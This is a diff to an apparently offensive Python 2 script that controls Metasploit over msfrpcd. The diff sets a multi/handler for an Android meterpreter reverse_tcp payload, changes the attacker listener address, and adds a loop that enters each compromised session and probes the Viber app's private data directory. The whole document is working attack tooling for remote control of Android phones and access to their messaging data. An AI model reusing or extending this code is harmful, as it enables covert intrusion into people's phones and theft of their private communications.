@@ -180,7 +180,7 @@ class Main:
 
             # start msf server and enter again
             if command == "server":
-                command = "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 192.168.1.128\nset lport 4444"
+                command = "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 172.20.22.202\nset lport 4444"
                 self.msfconsole.exec_command(command)
                 print self.msfconsole.get_response()
                 self.msfconsole.exec_command("exploit")
@@ -208,14 +208,24 @@ class Main:
             	infile = open('list.txt','r')
 		for i in range(6):
 			infile.readline()
-
+		
 		while True:
 			str = ""
 			str = infile.readline()
 			if len(str.split()) < 1:
 				break
 			tmpstr = self.wait_response("sessions " + str.split()[0])
+			if tmpstr.split()[0] == "[-]":
+				continue
+			command = "cd /data/data/com.viber.voip"
+			tmpstr = self.wait_response(command)
+			if tmpstr.split()[0] == "[-]":
+				self.wait_response("background")
+				continue
+			
 			self.wait_response("background")
+		
+		command = ""
 
             # If command not empty send it to msfrpcd
             if command:
@@ -247,5 +257,5 @@ except KeyboardInterrupt:
     exit(0)
 
 except AttributeError:
-    print "[-] You have to be connected to the server " + str(msg)
+    print "[-] You have to be connected to the server "
     exit(1)
